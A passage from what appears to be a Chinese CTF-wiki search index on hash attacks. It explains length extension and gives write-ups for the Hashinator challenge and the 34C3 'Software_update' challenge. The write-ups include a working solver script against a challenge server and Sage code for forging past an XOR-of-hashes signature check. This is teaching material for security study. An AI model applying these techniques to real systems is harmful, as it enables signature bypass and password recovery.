\u6bcf\u4e00\u5757\u5f97\u5230\u7684\u94fe\u63a5\u53d8\u91cf\u90fd\u4f1a\u88ab\u4f5c\u4e3a\u4e0b\u4e00\u6b21\u6267\u884chash\u51fd\u6570\u7684\u521d\u59cb\u5411\u91cfIV\u3002\u5728\u6700\u540e\u4e00\u5757\u7684\u65f6\u5019\uff0c\u624d\u4f1a\u5c06\u5176\u5bf9\u5e94\u7684\u94fe\u63a5\u53d8\u91cf\u8f6c\u6362\u4e3ahash\u503c\u3002 \u4e00\u822c\u653b\u51fb\u65f6\u5e94\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6 \u6211\u4eec\u5df2\u77e5 key \u7684\u957f\u5ea6\uff0c\u5982\u679c\u4e0d\u77e5\u9053\u7684\u8bdd\uff0c\u9700\u8981\u7206\u7834\u51fa\u6765 \u6211\u4eec\u53ef\u4ee5\u63a7\u5236 message \u7684\u6d88\u606f\u3002 \u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u5305\u542b key \u7684\u4e00\u4e2a\u6d88\u606f\u7684hash\u503c\u3002 \u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u5bf9(messge,x)\u6ee1\u8db3x=H(key \u2225 message)\u867d\u7136\u6211\u4eec\u5e76\u4e0d\u6e05\u695akey\u7684\u5185\u5bb9\u3002","title":"\u4ecb\u7ecd"},{"location":"crypto/hash/attack/#_3","text":"\u8fd9\u91cc\u4e0d\u59a8\u5047\u8bbe\u6211\u4eec\u6211\u4eec\u77e5\u9053\u4e86 hash(key+s) \u7684 hash \u503c\uff0c\u5176\u4e2d s \u662f\u5df2\u77e5\u7684\uff0c\u90a3\u4e48\u5176\u672c\u8eab\u5728\u8ba1\u7b97\u7684\u65f6\u5019\uff0c\u5fc5\u7136\u4f1a\u8fdb\u884c\u586b\u5145\u3002\u90a3\u4e48\u6211\u4eec\u9996\u5148\u53ef\u4ee5\u5f97\u5230 key+s \u6269\u5c55\u540e\u7684\u5b57\u7b26\u4e32 now\uff0c\u5373 now=key|s|padding \u90a3\u4e48\u5982\u679c\u6211\u4eec\u5728 now \u7684\u540e\u9762\u518d\u6b21\u9644\u52a0\u4e0a\u4e00\u90e8\u5206\u4fe1\u606fextra\uff0c\u5373 key|s|padding|extra \u8fd9\u6837\u518d\u53bb\u8ba1\u7b97hash\u503c\u7684\u65f6\u5019\uff0c \u4f1a\u5bf9 extra \u8fdb\u884c\u586b\u5145\u76f4\u5230\u6ee1\u8db3\u6761\u4ef6\u3002 \u5148\u8ba1\u7b97 now \u5bf9\u5e94\u7684\u94fe\u63a5\u53d8\u91cf IV1\uff0c\u800c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u8fd9\u90e8\u5206\u7684 hash \u503c\uff0c\u5e76\u4e14\u94fe\u63a5\u53d8\u91cf\u4ea7\u751f hash \u503c\u7684\u7b97\u6cd5\u662f\u53ef\u9006\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u94fe\u63a5\u53d8\u91cf\u3002 \u4e0b\u9762\u4f1a\u6839\u636e\u5f97\u5230\u7684\u94fe\u63a5\u53d8\u91cf IV1\uff0c\u5bf9 extra \u90e8\u5206\u8fdb\u884c\u54c8\u5e0c\u7b97\u6cd5\uff0c\u5e76\u8fd4\u56dehash\u503c\u3002 \u90a3\u4e48\u65e2\u7136\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e86\u7b2c\u4e00\u90e8\u5206\u7684 hash \u503c\uff0c\u5e76\u4e14\uff0c\u6211\u4eec\u8fd8\u77e5\u9053 extra \u7684\u503c\uff0c\u90a3\u4e48\u6211\u4eec\u4fbf\u53ef\u4ee5\u5f97\u5230\u6700\u540e\u7684hash\u503c\u3002 \u800c\u4e4b\u524d\u6211\u4eec\u4e5f\u8bf4\u4e86\u6211\u4eec\u53ef\u4ee5\u63a7\u5236 message \u7684\u503c\u3002\u90a3\u4e48\u5176\u5b9e s\uff0cpadding\uff0cextra \u6211\u4eec\u90fd\u662f\u53ef\u4ee5\u63a7\u5236\u7684\u3002\u6240\u4ee5\u6211\u4eec\u81ea\u7136\u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7684(message,x)\u6ee1\u8db3x=hash(key|message)\u3002","title":"\u653b\u51fb\u539f\u7406"},{"location":"crypto/hash/attack/#_4","text":"\u4f3c\u4e4e\u5927\u90fd\u662fweb\u91cc\u9762\u7684\uff0c\uff0c\u4e0d\u592a\u61c2web\uff0c\u6682\u65f6\u5148\u4e0d\u7ed9\u4f8b\u5b50\u4e86\u3002","title":"\u4f8b\u5b50"},{"location":"crypto/hash/attack/#_5","text":"hashpump \u5982\u4f55\u4f7f\u7528\u8bf7\u53c2\u8003github\u4e0a\u7684readme\u3002","title":"\u5de5\u5177"},{"location":"crypto/hash/attack/#hash","text":"\u4e00\u4e9b\u81ea\u5b9a\u4e49\u7684hash\u7b97\u6cd5\u53ef\u80fd\u662f\u53ef\u9006\u7684\u3002","title":"hash\u7b97\u6cd5\u8bbe\u8ba1\u6709\u8bef"},{"location":"crypto/hash/attack/#hashinator","text":"\u9898\u76ee\u7684\u903b\u8f91\u5f88\u7b80\u5355\uff0c\u4ece\u4e00\u4e2a\u77e5\u540d\u7684\u5bc6\u7801\u5b57\u5178\"rockyou\"\u6311\u9009\u51fa\u4e00\u4e2a password \uff0c\u5e76\u4e14\u4f7f\u7528\u591a\u79cdhash\u7b97\u6cd5\u968f\u673a\u7684\u54c8\u5e0c32\u8f6e\u3002\u6211\u4eec\u9700\u8981\u4ece\u6700\u540e\u7684hash\u7ed3\u679c\u4e2d\u7834\u89e3\u51fa\u539f\u59cb\u7684 password \u3002","title":"Hashinator"},{"location":"crypto/hash/attack/#_6","text":"\u9898\u76ee\u91c7\u7528\u7684hash\u7b97\u6cd5\u6709\uff1a md5 \uff0c sha1 \uff0c blake \uff0c scrypt \u3002 \u5173\u952e\u7684\u4ee3\u7801\u5982\u4e0b\uff1a password = self . generate_password () # from rock_you.txt salt = self . generate_salt ( password ) # \u4e0epassword\u7684\u957f\u5ea6\u6709\u5173 hash_rounds = self . generate_rounds () # \u751f\u6210\u8fdb\u884chash\u7b97\u6cd5\u7684\u987a\u5e8f password_hash = self . calculate_hash ( salt + password , hash_rounds ) 1. \u7a0b\u5e8f\u9996\u5148\u901a\u8fc7\u4ece rockyou.txt \u4e2d\u968f\u673a\u62bd\u53d6\u4e00\u4e2a password \uff0c\u4f5c\u4e3a\u52a0\u5bc6\u7684\u660e\u6587\u3002 2. \u7136\u540e\u6839\u636e\u62bd\u53d6\u7684 password \u7684\u957f\u5ea6\uff0c\u751f\u6210\u4e00\u4e2a\u957f\u5ea6\u4e3a 128 - len(password) \u7684 salt \u3002 3. \u4ece\u4e4b\u524d\u5217\u4e3e\u76844\u79cdhash\u7b97\u6cd5\u4e2d\u62bd\u53d6\uff0c\u7ec4\u621032\u8f6e\u7684\u54c8\u5e0c\u8fd0\u7b97\u3002 4. \u6839\u636e\u4e4b\u524d\u5f97\u5230\u7684 password \u3001 salt \u8ba1\u7b97\u51fa\u6700\u540e\u7ed9\u6211\u4eec\u7684 password_hash \u3002 \u5f88\u660e\u663e\uff0c\u6211\u4eec\u4e0d\u53ef\u80fd\u901a\u8fc7\u9006\u5411hash\u7b97\u6cd5\u6765\u5b8c\u6210\u9898\u76ee\u3002 \u6211\u4eec\u77e5\u9053\u6240\u6709\u7684\u53ef\u80fd\u7684\u660e\u6587\uff0c\u9996\u5148\u8003\u8651\u80fd\u5426\u901a\u8fc7\u6784\u9020\u5f69\u8679\u8868\u6765\u5b8c\u6210\u7a77\u4e3e\u3002\u4f46\u662f\u6ce8\u610f\u5230 generate_salt() \u51fd\u6570\u4e2d\uff0c salt \u548c password \u7684\u957f\u5ea6\u7ec4\u5408\u8d85\u8fc7\u4e86128byte\u7684\u957f\u5ea6\uff0c\u5e76\u4e14\u88ab\u6ce8\u91ca\u4e86 msize = 128 # f-you hashcat :D so\uff0c\u53ea\u80fd\u65e0\u5948\u653e\u5f03\u3002 \u90a3\u8fd9\u6837\u7684\u8bdd\uff0c\u53ea\u5b58\u5728\u4e00\u79cd\u53ef\u80fd\uff0c\u4e5f\u5373\u7b97\u6cd5\u53ef\u9006\u3002\u67e5\u770b calculate_hash() \u51fd\u6570\u7684\u5177\u4f53\u5b9e\u73b0\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u53ef\u7591\u7684\u4ee3\u7801\uff1a for i in range ( len ( hash_rounds )): interim_salt = xor ( interim_salt , hash_rounds [ - 1 - i ]( interim_hash )) interim_hash = xor ( interim_hash , hash_rounds [ i ]( interim_salt )) final_hash = interim_salt + interim_hash \u91cd\u65b0\u68b3\u7406\u4e00\u4e0b\u6211\u4eec\u77e5\u9053\u7684\u4fe1\u606f\uff1a 1. hash_rounds\u4e2d\u4fdd\u5b58\u4e8632\u8f6e\uff0c\u5373\u6bcf\u8f6e\u8981\u4f7f\u7528\u7684hash\u51fd\u6570\u53e5\u67c4\u3002 2. final_hash\u662f\u6700\u540e\u7ed9\u6211\u4eec\u7684hash\u7ed3\u679c\u3002 3. hash_rounds\u4e2d\u7684\u5185\u5bb9\u4e5f\u4f1a\u5728\u751f\u6210\u4e4b\u540e\u6253\u5370\u7ed9\u6211\u4eec\u3002 4. \u6211\u4eec\u5e0c\u671b\u5f97\u5230 interim_salt \u548c interim_hash \u5728\u7b2c\u4e00\u8f6e\u7684\u503c\u3002 5. interim_salt \u548c interim_hash \u7684\u957f\u5ea6\u5747\u4e3a64byte\u3002 \u4ed4\u7ec6\u89c2\u5bdf\u4e00\u4e0b interim_salt \u548c interim_hash \u7684\u8ba1\u7b97\u65b9\u6cd5\uff0c\u53ef\u4ee5\u53d1\u73b0\u5b83\u662f\u53ef\u9006\u7684\u3002 interim\\_hash_1 = interim\\_hash_2 \\oplus hash\\_rounds[i](interim\\_salt_3) interim\\_hash_1 = interim\\_hash_2 \\oplus hash\\_rounds[i](interim\\_salt_3) \u8fd9\u884c\u4ee3\u7801\u91cc\uff0c\u6211\u4eec\u5df2\u77e5 interim\\_hash_1 interim\\_hash_1 \u548c interim\\_salt_3 interim\\_salt_3 \uff0c\u7531\u6b64\u53ef\u4ee5\u63a8\u51fa interim\\_hash_2 interim\\_hash_2 \u7684\u503c\uff0c\u800c interim\\_hash_2 interim\\_hash_2 \u5219\u662f\u4e0a\u4e00\u8f6e\u7684 interim_hash \u3002 \u4ee5\u6b64\u65b9\u6cd5\u9006\u63a832\u6b21\uff0c\u5219\u53ef\u4ee5\u5f97\u5230\u6700\u521d\u7684 password \u548c salt \u3002 \u5177\u4f53\u7684\u89e3\u5bc6\u811a\u672c\u4e3a\uff1a import os import hashlib import socket import threading import socketserver import struct import time import threading # import pyscrypt from base64 import b64encode , b64decode from pwn import * def md5 ( bytestring ): return hashlib . md5 ( bytestring ) . digest () def sha ( bytestring ): return hashlib . sha1 ( bytestring ) . digest () def blake ( bytestring ): return hashlib . blake2b ( bytestring ) . digest () def scrypt ( bytestring ): l = int ( len ( bytestring ) / 2 ) salt = bytestring [: l ] p = bytestring [ l :] return hashlib . scrypt ( p , salt = salt , n = 2 ** 16 , r = 8 , p = 1 , maxmem = 67111936 ) # return pyscrypt.hash(p, salt, 2**16, 8, 1, dkLen=64) def xor ( s1 , s2 ): return b '' . join ([ bytes ([ s1 [ i ] ^ s2 [ i % len ( s2 )]]) for i in range ( len ( s1 ))]) def main (): # io = socket.socket(family=socket.AF_INET) # io.connect(('47.88.216.38', 20013)) io = remote ( '47.88.216.38' , 20013 ) print ( io . recv ( 1000 )) ans_array = bytearray () while True : buf = io . recv ( 1 ) if buf : ans_array . extend ( buf ) if buf == b '!' : break password_hash_base64 = ans_array [ ans_array . find ( b \"b'\" ) + 2 : ans_array . find ( b \"' \\n \" )] password_hash = b64decode ( password_hash_base64 ) print ( 'password:' , password_hash ) method_bytes = ans_array [ ans_array . find ( b 'used: \\n ' ) + 6 : ans_array . find ( b ' \\n Your' ) ] methods = method_bytes . split ( b ' \\n ' ) methods = [ bytes ( x . strip ( b '- ' )) . decode () for x in methods ] print ( methods ) in_salt = password_hash [: 64 ] in_hash = password_hash [ 64 :] for pos , neg in zip ( methods , methods [:: - 1 ]): ''' interim_salt = xor(interim_salt, hash_rounds[-1-i](interim_hash)) interim_hash = xor(interim_hash, hash_rounds[i](interim_salt)) ''' in_hash = xor ( in_hash , eval ( \"{}(in_salt)\" . format ( neg ))) in_salt = xor ( in_salt , eval ( \"{}(in_hash)\" . format ( pos ))) print ( in_hash , in_salt ) print ( in_hash [ - 20 :]) io . interactive () main ()","title":"\u5206\u6790"},{"location":"crypto/hash/attack/#hash_1","text":"import os import hashlib import socket import threading import socketserver import struct import time # import pyscrypt from base64 import b64encode def md5 ( bytestring ): return hashlib . md5 ( bytestring ) . digest () def sha ( bytestring ): return hashlib . sha1 ( bytestring ) . digest () def blake ( bytestring ): return hashlib . blake2b ( bytestring ) . digest () def scrypt ( bytestring ): l = int ( len ( bytestring ) / 2 ) salt = bytestring [: l ] p = bytestring [ l :] return hashlib . scrypt ( p , salt = salt , n = 2 ** 16 , r = 8 , p = 1 , maxmem = 67111936 ) # return pyscrypt.hash(p, salt, 2**16, 8, 1) def xor ( s1 , s2 ): return b '' . join ([ bytes ([ s1 [ i ] ^ s2 [ i % len ( s2 )]]) for i in range ( len ( s1 ))]) class HashHandler ( socketserver . BaseRequestHandler ): welcome_message = \"\"\" Welcome, young wanna-be Cracker, to the Hashinator. To prove your worthiness, you must display the power of your cracking skills. The test is easy: 1. We send you a password from the rockyou list, hashed using multiple randomly chosen algorithms. 2. You crack the hash and send back the original password. As you already know the dictionary and won't need any fancy password rules, {} seconds should be plenty, right? Please wait while we generate your hash... \"\"\" hashes = [ md5 , sha , blake , scrypt ] timeout = 10 total_rounds = 32 def handle ( self ): self . request . sendall ( self . welcome_message . format ( self . timeout ) . encode ()) password = self . generate_password () # from rock_you.txt salt = self . generate_salt ( password ) # \u4e0epassword\u7684\u957f\u5ea6\u6709\u5173 hash_rounds = self . generate_rounds () # \u751f\u6210\u8fdb\u884chash\u7b97\u6cd5\u7684\u987a\u5e8f password_hash = self . calculate_hash ( salt + password , hash_rounds ) self . generate_delay () self . request . sendall ( \"Challenge password hash: {} \\n \" . format ( b64encode ( password_hash )) . encode ()) self . request . sendall ( \"Rounds used: \\n \" . encode ()) test_rounds = [] for r in hash_rounds : test_rounds . append ( r ) for r in hash_rounds : self . request . sendall ( \"- {} \\n \" . format ( r . __name__ ) . encode ()) self . request . sendall ( \"Your time starts now! \\n \" . encode ()) self . request . settimeout ( self . timeout ) try : response = self . request . recv ( 1024 ) if response . strip () == password : self . request . sendall ( \"Congratulations! You are a true cracking master! \\n \" . encode ()) self . request . sendall ( \"Welcome to the club: {} \\n \" . format ( flag ) . encode ()) return except socket . timeout : pass self . request . sendall ( \"Your cracking skills are bad, and you should feel bad!\" . encode ()) def generate_password ( self ): rand = struct . unpack ( \"I\" , os . urandom ( 4 ))[ 0 ] lines = 14344391 # size of rockyou line = rand % lines password = \"\" f = open ( 'rockyou.txt' , 'rb' ) for i in range ( line ): password = f . readline () return password . strip () def generate_salt ( self , p ): msize = 128 # f-you hashcat :D salt_size = msize - len ( p ) return os . urandom ( salt_size ) def generate_rounds ( self ): rand = struct . unpack ( \"Q\" , os . urandom ( 8 ))[ 0 ] rounds = [] for i in range ( self . total_rounds ): rounds . append ( self . hashes [ rand % len ( self . hashes )]) rand = rand >> 2 return rounds def calculate_hash ( self , payload , hash_rounds ): interim_salt = payload [: 64 ] interim_hash = payload [ 64 :] for i in range ( len ( hash_rounds )): interim_salt = xor ( interim_salt , hash_rounds [ - 1 - i ]( interim_hash )) interim_hash = xor ( interim_hash , hash_rounds [ i ]( interim_salt )) ''' interim_hash = xor( interim_hash, hash_rounds[i]( xor(interim_salt, hash_rounds[-1-i](interim_hash)) ) ) ''' final_hash = interim_salt + interim_hash return final_hash def generate_delay ( self ): rand = struct . unpack ( \"I\" , os . urandom ( 4 ))[ 0 ] time . sleep ( rand / 1000000000.0 ) class ThreadedTCPServer ( socketserver . ThreadingMixIn , socketserver . TCPServer ): allow_reuse_address = True PORT = 1337 HOST = '0.0.0.0' flag = \"\" with open ( \"flag.txt\" ) as f : flag = f . read () def main (): server = ThreadedTCPServer (( HOST , PORT ), HashHandler ) server_thread = threading . Thread ( target = server . serve_forever ) server_thread . start () server_thread . join () if __name__ == \"__main__\" : main ()","title":"\u539fhash\u7b97\u6cd5"},{"location":"crypto/hash/complex/","text":"\u7efc\u5408\u9898\u76ee \u00b6 2017 34c3 Software_update \u00b6 \u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u7684\u5927\u6982\u610f\u601d\u662f\u4e0a\u4f20\u4e00\u4e2a zip \u538b\u7f29\u5305\uff0c\u7136\u540e\u5bf9 signed_data \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u8fdb\u884c\u7b7e\u540d\u9a8c\u8bc1\u3002\u5176\u4e2d\uff0c\u6700\u540e\u9a8c\u8bc1\u7684\u624b\u6cd5\u662f\u5927\u6982\u662f\u5c06\u6bcf\u4e00\u4e2a\u6587\u4ef6\u8fdb\u884c sha256 \u54c8\u5e0c\uff0c\u7136\u540e \u5f02\u6216 \u8d77\u6765\u4f5c\u4e3a\u8f93\u5165\u4f20\u9012\u7ed9 rsa \u8fdb\u884c\u7b7e\u540d\u3002\u5982\u679c\u901a\u8fc7\u9a8c\u8bc1\u7684\u8bdd\uff0c\u5c31\u4f1a\u6267\u884c\u5bf9\u5e94\u7684 pre-copy.py \u548c post-copy.py \u6587\u4ef6\u3002 \u5f88\u81ea\u7136\u7684\u60f3\u6cd5\u662f\u6211\u4eec\u4fee\u6539 pre-copy.py \u6216\u8005 post-copy.py \u6587\u4ef6\uff0c\u4f7f\u5176\u53ef\u4ee5\u8bfb\u53d6 flag\uff0c\u7136\u540e\u518d\u6b21\u7ed5\u8fc7\u7b7e\u540d\u5373\u53ef\u3002\u4e3b\u8981\u6709\u4e24\u79cd\u601d\u8def \u6839\u636e\u7ed9\u5b9a\u7684\u516c\u94a5\u6587\u4ef6\u83b7\u53d6\u5bf9\u5e94\u7684\u79c1\u94a5\uff0c\u8fdb\u800c\u518d\u4fee\u6539\u6587\u4ef6\u540e\u4f2a\u9020\u7b7e\u540d\uff0c\u7136\u540e\u5927\u6982\u770b\u4e86\u770b\u516c\u94a5\u6587\u4ef6\u51e0\u4e4e\u4e0d\u53ef\u7834\uff0c\u6240\u4ee5\u8fd9\u4e00\u70b9\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u653e\u5f03\u3002 \u4fee\u6539\u5bf9\u5e94\u6587\u4ef6\u540e\uff0c\u5229\u7528 \u5f02\u6216\u7684\u7279\u6027\u4f7f\u5f97\u5176\u54c8\u5e0c\u503c\u4ecd\u7136\u4e0e\u539f\u6765\u76f8\u540c \uff0c\u4ece\u800c\u7ed5\u8fc7\u7b7e\u540d\u68c0\u6d4b\u3002\u5373\u4f7f\u5f97 signed_data \u76ee\u5f55\u4e0b\u5305\u542b\u591a\u4e2a\u6587\u4ef6\uff0c\u4f7f\u5f97\u8fd9\u4e9b\u6587\u4ef6\u7684\u54c8\u5e0c\u503c\u6700\u540e\u5f02\u6216\u8d77\u6765\u53ef\u4ee5\u62b5\u6d88\u4fee\u6539 pre-copy.py \u6216\u8005 post-copy.py\u6587\u4ef6\u6240\u9020\u6210\u7684\u54c8\u5e0c\u503c\u7684\u4e0d\u540c\u3002 \u8fd9\u91cc\uff0c\u6211\u4eec\u9009\u62e9\u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff0c\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u4fee\u6539 pre-copy.py \u6587\u4ef6\uff0c\u5177\u4f53\u601d\u8def\u5982\u4e0b \u8ba1\u7b97 pre-copy.py \u7684\u539f hash \u503c\u3002 \u4fee\u6539 pre-copy.py \u6587\u4ef6\uff0c\u4f7f\u5176\u53ef\u4ee5\u8bfb\u53d6 flag\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u8ba1\u7b97\u65b0\u7684 hash \u503c\u3002\u5c06\u4e24\u8005\u5f02\u6216\uff0c\u6c42\u5f97\u5f02\u6216\u5dee\u503c delta\u3002 \u5bfb\u627e\u4e00\u7cfb\u5217\u7684\u6587\u4ef6\uff0c\u4f7f\u5176 hash \u503c\u5f02\u6216\u8d77\u6765\u6b63\u597d\u4e3a delta\u3002 \u5173\u952e\u7684\u6b65\u9aa4\u5728\u4e8e\u7b2c\u4e09\u6b65\uff0c\u800c\u5176\u5b9e\u8fd9\u4e2a\u6587\u4ef6\u53ef\u4ee5\u770b\u505a\u662f\u4e00\u4e2a\u7ebf\u6027\u7ec4\u5408\u7684\u95ee\u9898\uff0c\u5373\u5bfb\u627e\u82e5\u5e72\u4e2a 256 \u7ef401\u5411\u91cf\u4f7f\u5176\u5f02\u6216\u503c\u4e3a delta\u3002\u800c $$ (F={0,1},F^{256},\\oplus ,\\cdot) $$ \u662f\u4e00\u4e2a 256 \u7ef4\u7684\u5411\u91cf\u7a7a\u95f4\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u8be5\u5411\u91cf\u7a7a\u95f4\u7684\u4e00\u4e2a\u57fa\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6c42\u5f97\u8be5\u7a7a\u95f4\u4e2d\u4efb\u610f\u6307\u5b9a\u503c\u7684\u6240\u9700\u8981\u7684\u5411\u91cf\u3002 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 sage \u6765\u8f85\u52a9\u6211\u4eec\u6c42\uff0c\u5982\u4e0b # generage the base of <{0,1},F^256,xor,*> def gen_gf2_256_base (): v = VectorSpace ( GF ( 2 ), 256 ) tmphash = compute_file_hash ( \"0.py\" , \"\" ) tmphash_bin = hash2bin ( tmphash ) base = [ tmphash_bin ] filelist = [ '0.py' ] print base s = v . subspace ( base ) dim = s . dimension () cnt = 1 while dim != 256 : tmpfile = str ( cnt ) + \".py\" tmphash = compute_file_hash ( tmpfile , \"\" ) tmphash_bin = hash2bin ( tmphash ) old_dim = dim s = v . subspace ( base + [ tmphash_bin ]) dim = s . dimension () if dim > old_dim : base += [ tmphash_bin ] filelist . append ( tmpfile ) print ( \"dimension \" + str ( s . dimension ())) cnt += 1 print ( cnt ) m = matrix ( GF ( 2 ), 256 , 256 , base ) m = m . transpose () return m , filelist \u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u89e3\u7b54\uff0c\u8bf7\u53c2\u8003 exp.py \u3002 \u8fd9\u91cc\u6211\u4fee\u6539 pre-copy \u591a\u8f93\u51fa !!!!come here!!!! \u5b57\u773c\uff0c\u5982\u4e0b \u279c software_update git: ( master ) python3 installer.py now.zip Preparing to copy data... !!!!come here!!!! Software update installed successfully. \u53c2\u8003\u6587\u732e \u00b6 https://sectt.github.io/writeups/34C3CTF/crypto_182_software_update/Readme https://github.com/OOTS/34c3ctf/blob/master/software_update/solution/exploit.py","title":"\u7efc\u5408"},{"location":"crypto/hash/complex/#_1","text":"","title":"\u7efc\u5408\u9898\u76ee"},{"location":"crypto/hash/complex/#2017-34c3-software_update","text":"\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u7684\u5927\u6982\u610f\u601d\u662f\u4e0a\u4f20\u4e00\u4e2a zip \u538b\u7f29\u5305\uff0c\u7136\u540e\u5bf9 signed_data \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u8fdb\u884c\u7b7e\u540d\u9a8c\u8bc1\u3002\u5176\u4e2d\uff0c\u6700\u540e\u9a8c\u8bc1\u7684\u624b\u6cd5\u662f\u5927\u6982\u662f\u5c06\u6bcf\u4e00\u4e2a\u6587\u4ef6\u8fdb\u884c sha256 \u54c8\u5e0c\uff0c\u7136\u540e \u5f02\u6216 \u8d77\u6765\u4f5c\u4e3a\u8f93\u5165\u4f20\u9012\u7ed9 rsa \u8fdb\u884c\u7b7e\u540d\u3002\u5982\u679c\u901a\u8fc7\u9a8c\u8bc1\u7684\u8bdd\uff0c\u5c31\u4f1a\u6267\u884c\u5bf9\u5e94\u7684 pre-copy.py \u548c post-copy.py \u6587\u4ef6\u3002 \u5f88\u81ea\u7136\u7684\u60f3\u6cd5\u662f\u6211\u4eec\u4fee\u6539 pre-copy.py \u6216\u8005 post-copy.py \u6587\u4ef6\uff0c\u4f7f\u5176\u53ef\u4ee5\u8bfb\u53d6 flag\uff0c\u7136\u540e\u518d\u6b21\u7ed5\u8fc7\u7b7e\u540d\u5373\u53ef\u3002\u4e3b\u8981\u6709\u4e24\u79cd\u601d\u8def \u6839\u636e\u7ed9\u5b9a\u7684\u516c\u94a5\u6587\u4ef6\u83b7\u53d6\u5bf9\u5e94\u7684\u79c1\u94a5\uff0c\u8fdb\u800c\u518d\u4fee\u6539\u6587\u4ef6\u540e\u4f2a\u9020\u7b7e\u540d\uff0c\u7136\u540e\u5927\u6982\u770b\u4e86\u770b\u516c\u94a5\u6587\u4ef6\u51e0\u4e4e\u4e0d\u53ef\u7834\uff0c\u6240\u4ee5\u8fd9\u4e00\u70b9\uff0c\u57fa\u672c\u4e0a\u53ef\u4ee5\u653e\u5f03\u3002 \u4fee\u6539\u5bf9\u5e94\u6587\u4ef6\u540e\uff0c\u5229\u7528 \u5f02\u6216\u7684\u7279\u6027\u4f7f\u5f97\u5176\u54c8\u5e0c\u503c\u4ecd\u7136\u4e0e\u539f\u6765\u76f8\u540c \uff0c\u4ece\u800c\u7ed5\u8fc7\u7b7e\u540d\u68c0\u6d4b\u3002\u5373\u4f7f\u5f97 signed_data \u76ee\u5f55\u4e0b\u5305\u542b\u591a\u4e2a\u6587\u4ef6\uff0c\u4f7f\u5f97\u8fd9\u4e9b\u6587\u4ef6\u7684\u54c8\u5e0c\u503c\u6700\u540e\u5f02\u6216\u8d77\u6765\u53ef\u4ee5\u62b5\u6d88\u4fee\u6539 pre-copy.py \u6216\u8005 post-copy.py\u6587\u4ef6\u6240\u9020\u6210\u7684\u54c8\u5e0c\u503c\u7684\u4e0d\u540c\u3002 \u8fd9\u91cc\uff0c\u6211\u4eec\u9009\u62e9\u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff0c\u8fd9\u91cc\u6211\u4eec\u9009\u62e9\u4fee\u6539 pre-copy.py \u6587\u4ef6\uff0c\u5177\u4f53\u601d\u8def\u5982\u4e0b \u8ba1\u7b97 pre-copy.py \u7684\u539f hash \u503c\u3002 \u4fee\u6539 pre-copy.py \u6587\u4ef6\uff0c\u4f7f\u5176\u53ef\u4ee5\u8bfb\u53d6 flag\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u8ba1\u7b97\u65b0\u7684 hash \u503c\u3002\u5c06\u4e24\u8005\u5f02\u6216\uff0c\u6c42\u5f97\u5f02\u6216\u5dee\u503c delta\u3002 \u5bfb\u627e\u4e00\u7cfb\u5217\u7684\u6587\u4ef6\uff0c\u4f7f\u5176 hash \u503c\u5f02\u6216\u8d77\u6765\u6b63\u597d\u4e3a delta\u3002 \u5173\u952e\u7684\u6b65\u9aa4\u5728\u4e8e\u7b2c\u4e09\u6b65\uff0c\u800c\u5176\u5b9e\u8fd9\u4e2a\u6587\u4ef6\u53ef\u4ee5\u770b\u505a\u662f\u4e00\u4e2a\u7ebf\u6027\u7ec4\u5408\u7684\u95ee\u9898\uff0c\u5373\u5bfb\u627e\u82e5\u5e72\u4e2a 256 \u7ef401\u5411\u91cf\u4f7f\u5176\u5f02\u6216\u503c\u4e3a delta\u3002\u800c $$ (F={0,1},F^{256},\\oplus ,\\cdot) $$ \u662f\u4e00\u4e2a 256 \u7ef4\u7684\u5411\u91cf\u7a7a\u95f4\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u8be5\u5411\u91cf\u7a7a\u95f4\u7684\u4e00\u4e2a\u57fa\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6c42\u5f97\u8be5\u7a7a\u95f4\u4e2d\u4efb\u610f\u6307\u5b9a\u503c\u7684\u6240\u9700\u8981\u7684\u5411\u91cf\u3002 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 sage \u6765\u8f85\u52a9\u6211\u4eec\u6c42\uff0c\u5982\u4e0b # generage the base of <{0,1},F^256,xor,*> def gen_gf2_256_base (): v = VectorSpace ( GF ( 2 ), 256 ) tmphash = compute_file_hash ( \"0.py\" , \"\" ) tmphash_bin = hash2bin ( tmphash ) base = [ tmphash_bin ] filelist = [ '0.py' ] print base s = v . subspace ( base ) dim = s . dimension () cnt = 1 while dim != 256 : tmpfile = str ( cnt ) + \".py\" tmphash = compute_file_hash ( tmpfile , \"\" ) tmphash_bin = hash2bin ( tmphash ) old_dim = dim s = v . subspace ( base + [ tmphash_bin ]) dim = s . dimension () if dim > old_dim : base += [ tmphash_bin ] filelist . append ( tmpfile ) print ( \"dimension \" + str ( s . dimension ())) cnt += 1 print ( cnt ) m = matrix ( GF ( 2 ), 256 , 256 , base ) m = m . transpose () return m , filelist \u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u89e3\u7b54\uff0c\u8bf7\u53c2\u8003 exp.py \u3002 \u8fd9\u91cc\u6211\u4fee\u6539 pre-copy \u591a\u8f93\u51fa !!!!come here!!!! \u5b57\u773c\uff0c\u5982\u4e0b \u279c software_update git: ( master ) python3 installer.py now.zip Preparing to copy data... !!!!come here!!!! Software update installed successfully.","title":"2017 34c3 